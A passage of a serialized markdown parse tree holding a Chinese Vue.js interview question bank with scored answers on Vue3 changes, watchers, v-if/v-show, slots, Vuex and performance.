API：基于函数的API，更加灵活组织组件逻辑（vue2用的是options api）","text":"**1：** 支持 Composition API：基于函数的API，更加灵活组织组件逻辑（vue2用的是options api）","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 支持 Composition API：基于函数的API，更加灵活组织组件逻辑（vue2用的是options api）","text":" 支持 Composition API：基于函数的API，更加灵活组织组件逻辑（vue2用的是options api）","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 响应式系统提升：Vue3中响应式数据原理改成proxy，可监听动态新增删除属性，以及数组变化\\n","task":false,"loose":false,"text":"**1：** 响应式系统提升：Vue3中响应式数据原理改成proxy，可监听动态新增删除属性，以及数组变化","tokens":[{"type":"text","raw":"**1：** 响应式系统提升：Vue3中响应式数据原理改成proxy，可监听动态新增删除属性，以及数组变化","text":"**1：** 响应式系统提升：Vue3中响应式数据原理改成proxy，可监听动态新增删除属性，以及数组变化","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 响应式系统提升：Vue3中响应式数据原理改成proxy，可监听动态新增删除属性，以及数组变化","text":" 响应式系统提升：Vue3中响应式数据原理改成proxy，可监听动态新增删除属性，以及数组变化","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 编译优化：vue2通过标记静态根节点优化diff，Vue3 标记和提升所有静态根节点，diff的时候只需要对比动态节点内容\\n","task":false,"loose":false,"text":"**1：** 编译优化：vue2通过标记静态根节点优化diff，Vue3 标记和提升所有静态根节点，diff的时候只需要对比动态节点内容","tokens":[{"type":"text","raw":"**1：** 编译优化：vue2通过标记静态根节点优化diff，Vue3 标记和提升所有静态根节点，diff的时候只需要对比动态节点内容","text":"**1：** 编译优化：vue2通过标记静态根节点优化diff，Vue3 标记和提升所有静态根节点，diff的时候只需要对比动态节点内容","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 编译优化：vue2通过标记静态根节点优化diff，Vue3 标记和提升所有静态根节点，diff的时候只需要对比动态节点内容","text":" 编译优化：vue2通过标记静态根节点优化diff，Vue3 标记和提升所有静态根节点，diff的时候只需要对比动态节点内容","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 打包体积优化：移除了一些不常用的api（inline-template、filter）\\n","task":false,"loose":false,"text":"**1：** 打包体积优化：移除了一些不常用的api（inline-template、filter）","tokens":[{"type":"text","raw":"**1：** 打包体积优化：移除了一些不常用的api（inline-template、filter）","text":"**1：** 打包体积优化：移除了一些不常用的api（inline-template、filter）","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 打包体积优化：移除了一些不常用的api（inline-template、filter）","text":" 打包体积优化：移除了一些不常用的api（inline-template、filter）","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 生命周期的变化：使用setup代替了之前的beforeCreate和created\\n","task":false,"loose":false,"text":"**1：** 生命周期的变化：使用setup代替了之前的beforeCreate和created","tokens":[{"type":"text","raw":"**1：** 生命周期的变化：使用setup代替了之前的beforeCreate和created","text":"**1：** 生命周期的变化：使用setup代替了之前的beforeCreate和created","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 生命周期的变化：使用setup代替了之前的beforeCreate和created","text":" 生命周期的变化：使用setup代替了之前的beforeCreate和created","escaped":false}]}]},{"type":"list_item","raw":"* **1：** Vue3 的 template 模板支持多个根标签\\n","task":false,"loose":false,"text":"**1：** Vue3 的 template 模板支持多个根标签","tokens":[{"type":"text","raw":"**1：** Vue3 的 template 模板支持多个根标签","text":"**1：** Vue3 的 template 模板支持多个根标签","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Vue3 的 template 模板支持多个根标签","text":" Vue3 的 template 模板支持多个根标签","escaped":false}]}]},{"type":"list_item","raw":"* **1：** Vuex状态管理：创建实例的方式改变,Vue2为new Store , Vue3为createStore\\n","task":false,"loose":false,"text":"**1：** Vuex状态管理：创建实例的方式改变,Vue2为new Store , Vue3为createStore","tokens":[{"type":"text","raw":"**1：** Vuex状态管理：创建实例的方式改变,Vue2为new Store , Vue3为createStore","text":"**1：** Vuex状态管理：创建实例的方式改变,Vue2为new Store , Vue3为createStore","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Vuex状态管理：创建实例的方式改变,Vue2为new Store , Vue3为createStore","text":" Vuex状态管理：创建实例的方式改变,Vue2为new Store , Vue3为createStore","escaped":false}]}]},{"type":"list_item","raw":"* **1：** Route 获取页面实例与路由信息：vue2通过this获取router实例，vue3通过使用 getCurrentInstance/ userRoute和userRouter方法获取当前组件实例\\n","task":false,"loose":false,"text":"**1：** Route 获取页面实例与路由信息：vue2通过this获取router实例，vue3通过使用 getCurrentInstance/ userRoute和userRouter方法获取当前组件实例","tokens":[{"type":"text","raw":"**1：** Route 获取页面实例与路由信息：vue2通过this获取router实例，vue3通过使用 getCurrentInstance/ userRoute和userRouter方法获取当前组件实例","text":"**1：** Route 获取页面实例与路由信息：vue2通过this获取router实例，vue3通过使用 getCurrentInstance/ userRoute和userRouter方法获取当前组件实例","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Route 获取页面实例与路由信息：vue2通过this获取router实例，vue3通过使用 getCurrentInstance/ userRoute和userRouter方法获取当前组件实例","text":" Route 获取页面实例与路由信息：vue2通过this获取router实例，vue3通过使用 getCurrentInstance/ userRoute和userRouter方法获取当前组件实例","escaped":false}]}]},{"type":"list_item","raw":"* **1：** Props 的使用变化：vue2 通过 this 获取 props 里面的内容，vue3 直接通过 props\\n","task":false,"loose":false,"text":"**1：** Props 的使用变化：vue2 通过 this 获取 props 里面的内容，vue3 直接通过 props","tokens":[{"type":"text","raw":"**1：** Props 的使用变化：vue2 通过 this 获取 props 里面的内容，vue3 直接通过 props","text":"**1：** Props 的使用变化：vue2 通过 this 获取 props 里面的内容，vue3 直接通过 props","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Props 的使用变化：vue2 通过 this 获取 props 里面的内容，vue3 直接通过 props","text":" Props 的使用变化：vue2 通过 this 获取 props 里面的内容，vue3 直接通过 props","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 父子组件传值：vue3 在向父组件传回数据时，如使用的自定义名称，如 backData，则需要在 emits 中定义一下","task":false,"loose":false,"text":"**1：** 父子组件传值：vue3 在向父组件传回数据时，如使用的自定义名称，如 backData，则需要在 emits 中定义一下","tokens":[{"type":"text","raw":"**1：** 父子组件传值：vue3 在向父组件传回数据时，如使用的自定义名称，如 backData，则需要在 emits 中定义一下","text":"**1：** 父子组件传值：vue3 在向父组件传回数据时，如使用的自定义名称，如 backData，则需要在 emits 中定义一下","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 父子组件传值：vue3 在向父组件传回数据时，如使用的自定义名称，如 backData，则需要在 emits 中定义一下","text":" 父子组件传值：vue3 在向父组件传回数据时，如使用的自定义名称，如 backData，则需要在 emits 中定义一下","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## watch 和 watchEffect 的区别？\\n\\n","depth":2,"text":"watch 和 watchEffect 的区别？","tokens":[{"type":"text","raw":"watch 和 watchEffect 的区别？","text":"watch 和 watchEffect 的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3分）\\n\\n","depth":4,"text":"解答（3分）","tokens":[{"type":"text","raw":"解答（3分）","text":"解答（3分）","escaped":false}]},{"type":"list","raw":"* **1：** watch ：既要指明监视的数据源，也要指明监视的回调。\\n* **1：** watchEffect 可以自动监听数据源作为依赖。不用指明监视哪个数据，监视的回调中用到哪个数据，那就监视哪个数据。\\n* **1：** watch 可以访问改变之前和之后的值，watchEffect 只能获取改变后的值。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** watch ：既要指明监视的数据源，也要指明监视的回调。\\n","task":false,"loose":false,"text":"**1：** watch ：既要指明监视的数据源，也要指明监视的回调。","tokens":[{"type":"text","raw":"**1：** watch ：既要指明监视的数据源，也要指明监视的回调。","text":"**1：** watch ：既要指明监视的数据源，也要指明监视的回调。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" watch ：既要指明监视的数据源，也要指明监视的回调。","text":" watch ：既要指明监视的数据源，也要指明监视的回调。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** watchEffect 可以自动监听数据源作为依赖。不用指明监视哪个数据，监视的回调中用到哪个数据，那就监视哪个数据。\\n","task":false,"loose":false,"text":"**1：** watchEffect 可以自动监听数据源作为依赖。不用指明监视哪个数据，监视的回调中用到哪个数据，那就监视哪个数据。","tokens":[{"type":"text","raw":"**1：** watchEffect 可以自动监听数据源作为依赖。不用指明监视哪个数据，监视的回调中用到哪个数据，那就监视哪个数据。","text":"**1：** watchEffect 可以自动监听数据源作为依赖。不用指明监视哪个数据，监视的回调中用到哪个数据，那就监视哪个数据。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" watchEffect 可以自动监听数据源作为依赖。不用指明监视哪个数据，监视的回调中用到哪个数据，那就监视哪个数据。","text":" watchEffect 可以自动监听数据源作为依赖。不用指明监视哪个数据，监视的回调中用到哪个数据，那就监视哪个数据。","escaped":false}]}]},{"type":"list_item","raw":"* **1：** watch 可以访问改变之前和之后的值，watchEffect 只能获取改变后的值。","task":false,"loose":false,"text":"**1：** watch 可以访问改变之前和之后的值，watchEffect 只能获取改变后的值。","tokens":[{"type":"text","raw":"**1：** watch 可以访问改变之前和之后的值，watchEffect 只能获取改变后的值。","text":"**1：** watch 可以访问改变之前和之后的值，watchEffect 只能获取改变后的值。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" watch 可以访问改变之前和之后的值，watchEffect 只能获取改变后的值。","text":" watch 可以访问改变之前和之后的值，watchEffect 只能获取改变后的值。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 在 Vue2.x 中如何检测数组的变化？\\n\\n","depth":2,"text":"在 Vue2.x 中如何检测数组的变化？","tokens":[{"type":"text","raw":"在 Vue2.x 中如何检测数组的变化？","text":"在 Vue2.x 中如何检测数组的变化？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"list","raw":"* **1：** 使用了函数劫持的方式，重写了数组的方法，Vue将data中的数组进行了原型链重写，指向了自己定义的数组原型方法。这样当调用数组api时，可以通知依赖更新。如果数组中包含着引用类型，会对数组中的引用类型再次递归遍历进行监控。这样就实现了监测数组变化。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 使用了函数劫持的方式，重写了数组的方法，Vue将data中的数组进行了原型链重写，指向了自己定义的数组原型方法。这样当调用数组api时，可以通知依赖更新。如果数组中包含着引用类型，会对数组中的引用类型再次递归遍历进行监控。这样就实现了监测数组变化。","task":false,"loose":false,"text":"**1：** 使用了函数劫持的方式，重写了数组的方法，Vue将data中的数组进行了原型链重写，指向了自己定义的数组原型方法。这样当调用数组api时，可以通知依赖更新。如果数组中包含着引用类型，会对数组中的引用类型再次递归遍历进行监控。这样就实现了监测数组变化。","tokens":[{"type":"text","raw":"**1：** 使用了函数劫持的方式，重写了数组的方法，Vue将data中的数组进行了原型链重写，指向了自己定义的数组原型方法。这样当调用数组api时，可以通知依赖更新。如果数组中包含着引用类型，会对数组中的引用类型再次递归遍历进行监控。这样就实现了监测数组变化。","text":"**1：** 使用了函数劫持的方式，重写了数组的方法，Vue将data中的数组进行了原型链重写，指向了自己定义的数组原型方法。这样当调用数组api时，可以通知依赖更新。如果数组中包含着引用类型，会对数组中的引用类型再次递归遍历进行监控。这样就实现了监测数组变化。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 使用了函数劫持的方式，重写了数组的方法，Vue将data中的数组进行了原型链重写，指向了自己定义的数组原型方法。这样当调用数组api时，可以通知依赖更新。如果数组中包含着引用类型，会对数组中的引用类型再次递归遍历进行监控。这样就实现了监测数组变化。","text":" 使用了函数劫持的方式，重写了数组的方法，Vue将data中的数组进行了原型链重写，指向了自己定义的数组原型方法。这样当调用数组api时，可以通知依赖更新。如果数组中包含着引用类型，会对数组中的引用类型再次递归遍历进行监控。这样就实现了监测数组变化。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 在 v-if 与 v-show 的区别？\\n\\n","depth":2,"text":"在 v-if 与 v-show 的区别？","tokens":[{"type":"text","raw":"在 v-if 与 v-show 的区别？","text":"在 v-if 与 v-show 的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"list","raw":"* **1：** 当条件不成立时，v-if不会渲染DOM元素，v-show操作的是样式(display)，切换当前DOM的显示和隐藏。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 当条件不成立时，v-if不会渲染DOM元素，v-show操作的是样式(display)，切换当前DOM的显示和隐藏。","task":false,"loose":false,"text":"**1：** 当条件不成立时，v-if不会渲染DOM元素，v-show操作的是样式(display)，切换当前DOM的显示和隐藏。","tokens":[{"type":"text","raw":"**1：** 当条件不成立时，v-if不会渲染DOM元素，v-show操作的是样式(display)，切换当前DOM的显示和隐藏。","text":"**1：** 当条件不成立时，v-if不会渲染DOM元素，v-show操作的是样式(display)，切换当前DOM的显示和隐藏。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 当条件不成立时，v-if不会渲染DOM元素，v-show操作的是样式(display)，切换当前DOM的显示和隐藏。","text":" 当条件不成立时，v-if不会渲染DOM元素，v-show操作的是样式(display)，切换当前DOM的显示和隐藏。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何实现 Vue 组件的插槽（slot）？有哪些类型的插槽？\\n\\n","depth":2,"text":"如何实现 Vue 组件的插槽（slot）？有哪些类型的插槽？","tokens":[{"type":"text","raw":"如何实现 Vue 组件的插槽（slot）？有哪些类型的插槽？","text":"如何实现 Vue 组件的插槽（slot）？有哪些类型的插槽？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"list","raw":"* **1：** 默认插槽、具名插槽、作用域插槽","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 默认插槽、具名插槽、作用域插槽","task":false,"loose":false,"text":"**1：** 默认插槽、具名插槽、作用域插槽","tokens":[{"type":"text","raw":"**1：** 默认插槽、具名插槽、作用域插槽","text":"**1：** 默认插槽、具名插槽、作用域插槽","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 默认插槽、具名插槽、作用域插槽","text":" 默认插槽、具名插槽、作用域插槽","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 简述 Vuex 的核心概念和工作流程\\n\\n","depth":2,"text":"简述 Vuex 的核心概念和工作流程","tokens":[{"type":"text","raw":"简述 Vuex 的核心概念和工作流程","text":"简述 Vuex 的核心概念和工作流程","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2分）\\n\\n","depth":4,"text":"解答（2分）","tokens":[{"type":"text","raw":"解答（2分）","text":"解答（2分）","escaped":false}]},{"type":"list","raw":"* **1：** 核心概念:<br/>\\n&emsp;State：存储应用的状态数据，是一个单一的数据源，所有组件都可以访问, <br/>\\n&emsp;Mutations：用于同步修改 State 中的数据。\\n是唯一允许修改 State 的地方，它接收 State 作为第一个参数。<br>\\n&emsp;Actions：用于处理异步操作，如异步数据获取等，它不能直接修改 State，而是通过提交 Mutations 来间接修改。<br/>\\n&emsp;Getters(类似于计算属性，用于从 State 中派生出一些新的数据，方便组件获取和使用)\\n* **1：** 工作流程：<br/>组件通过 dispatch 方法触发 Actions，Actions 中可以进行异步操作，然后通过 commit 提交 Mutations，\\nMutations 同步修改 State 的数据，组件可以通过 mapState、mapGetters 等辅助函数获取 State 和 Getters 中的数据，从而实现数据的响应式变化\\n和组件的更新。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"* **1：** 核心概念:<br/>\\n&emsp;State：存储应用的状态数据，是一个单一的数据源，所有组件都可以访问, <br/>\\n&emsp;Mutations：用于同步修改 State 中的数据。\\n是唯一允许修改 State 的地方，它接收 State 作为第一个参数。<br>\\n&emsp;Actions：用于处理异步操作，如异步数据获取等，它不能直接修改 State，而是通过提交 Mutations 来间接修改。<br/>\\n&emsp;Getters(类似于计算属性，用于从 State 中派生出一些新的数据，方便组件获取和使用)\\n","task":false,"loose":false,"text":"**1：** 核心概念:<br/>\\n&emsp;State：存储应用的状态数据，是一个单一的数据源，所有组件都可以访问, <br/>\\n&emsp;Mutations：用于同步修改 State 中的数据。\\n是唯一允许修改 State 的地方，它接收 State 作为第一个参数。<br>\\n&emsp;Actions：用于处理异步操作，如异步数据获取等，它不能直接修改 State，而是通过提交 Mutations 来间接修改。<br/>\\n&emsp;Getters(类似于计算属性，用于从 State 中派生出一些新的数据，方便组件获取和使用)","tokens":[{"type":"text","raw":"**1：** 核心概念:<br/>\\n\\n&emsp;State：存储应用的状态数据，是一个单一的数据源，所有组件都可以访问, <br/>\\n\\n&emsp;Mutations：用于同步修改 State 中的数据。\\n\\n是唯一允许修改 State 的地方，它接收 State 作为第一个参数。<br>\\n\\n&emsp;Actions：用于处理异步操作，如异步数据获取等，它不能直接修改 State，而是通过提交 Mutations 来间接修改。<br/>\\n\\n&emsp;Getters(类似于计算属性，用于从 State 中派生出一些新的数据，方便组件获取和使用)","text":"**1：** 核心概念:<br/>\\n&emsp;State：存储应用的状态数据，是一个单一的数据源，所有组件都可以访问, <br/>\\n&emsp;Mutations：用于同步修改 State 中的数据。\\n是唯一允许修改 State 的地方，它接收 State 作为第一个参数。<br>\\n&emsp;Actions：用于处理异步操作，如异步数据获取等，它不能直接修改 State，而是通过提交 Mutations 来间接修改。<br/>\\n&emsp;Getters(类似于计算属性，用于从 State 中派生出一些新的数据，方便组件获取和使用)","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 核心概念:","text":" 核心概念:","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;State：存储应用的状态数据，是一个单一的数据源，所有组件都可以访问, ","text":"\\n&emsp;State：存储应用的状态数据，是一个单一的数据源，所有组件都可以访问, ","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;Mutations：用于同步修改 State 中的数据。\\n是唯一允许修改 State 的地方，它接收 State 作为第一个参数。","text":"\\n&emsp;Mutations：用于同步修改 State 中的数据。\\n是唯一允许修改 State 的地方，它接收 State 作为第一个参数。","escaped":false},{"type":"html","raw":"<br>","inLink":false,"inRawBlock":false,"block":false,"text":"<br>"},{"type":"text","raw":"\\n&emsp;Actions：用于处理异步操作，如异步数据获取等，它不能直接修改 State，而是通过提交 Mutations 来间接修改。","text":"\\n&emsp;Actions：用于处理异步操作，如异步数据获取等，它不能直接修改 State，而是通过提交 Mutations 来间接修改。","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"\\n&emsp;Getters(类似于计算属性，用于从 State 中派生出一些新的数据，方便组件获取和使用)","text":"\\n&emsp;Getters(类似于计算属性，用于从 State 中派生出一些新的数据，方便组件获取和使用)","escaped":false}]}]},{"type":"list_item","raw":"* **1：** 工作流程：<br/>组件通过 dispatch 方法触发 Actions，Actions 中可以进行异步操作，然后通过 commit 提交 Mutations，\\nMutations 同步修改 State 的数据，组件可以通过 mapState、mapGetters 等辅助函数获取 State 和 Getters 中的数据，从而实现数据的响应式变化\\n和组件的更新。","task":false,"loose":false,"text":"**1：** 工作流程：<br/>组件通过 dispatch 方法触发 Actions，Actions 中可以进行异步操作，然后通过 commit 提交 Mutations，\\nMutations 同步修改 State 的数据，组件可以通过 mapState、mapGetters 等辅助函数获取 State 和 Getters 中的数据，从而实现数据的响应式变化\\n和组件的更新。","tokens":[{"type":"text","raw":"**1：** 工作流程：<br/>组件通过 dispatch 方法触发 Actions，Actions 中可以进行异步操作，然后通过 commit 提交 Mutations，\\n\\nMutations 同步修改 State 的数据，组件可以通过 mapState、mapGetters 等辅助函数获取 State 和 Getters 中的数据，从而实现数据的响应式变化\\n\\n和组件的更新。","text":"**1：** 工作流程：<br/>组件通过 dispatch 方法触发 Actions，Actions 中可以进行异步操作，然后通过 commit 提交 Mutations，\\nMutations 同步修改 State 的数据，组件可以通过 mapState、mapGetters 等辅助函数获取 State 和 Getters 中的数据，从而实现数据的响应式变化\\n和组件的更新。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 工作流程：","text":" 工作流程：","escaped":false},{"type":"html","raw":"<br/>","inLink":false,"inRawBlock":false,"block":false,"text":"<br/>"},{"type":"text","raw":"组件通过 dispatch 方法触发 Actions，Actions 中可以进行异步操作，然后通过 commit 提交 Mutations，\\nMutations 同步修改 State 的数据，组件可以通过 mapState、mapGetters 等辅助函数获取 State 和 Getters 中的数据，从而实现数据的响应式变化\\n和组件的更新。","text":"组件通过 dispatch 方法触发 Actions，Actions 中可以进行异步操作，然后通过 commit 提交 Mutations，\\nMutations 同步修改 State 的数据，组件可以通过 mapState、mapGetters 等辅助函数获取 State 和 Getters 中的数据，从而实现数据的响应式变化\\n和组件的更新。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Vue项目中如何进行性能优化？\\n\\n","depth":2,"text":"Vue项目中如何进行性能优化？","tokens":[{"type":"text","raw":"Vue项目中如何进行性能优化？","text":"Vue项目中如何进行性能优化？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（10分）\\n\\n","depth":4,"text":"解答（10分）","tokens":[{"type":"text","raw":"解答（10分）","text":"解答（10分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"* **1：** 合理使用v-show和v-if：<br/>\\n&emsp;原理：v-if是真正的条件渲染，它会在条件为假时销毁组件，在条件为真时重新创建组件，这涉及到 DOM 元素的销毁和重建过程。\\n而v - show只是简单地切换元素的CSS的display属性，组件的 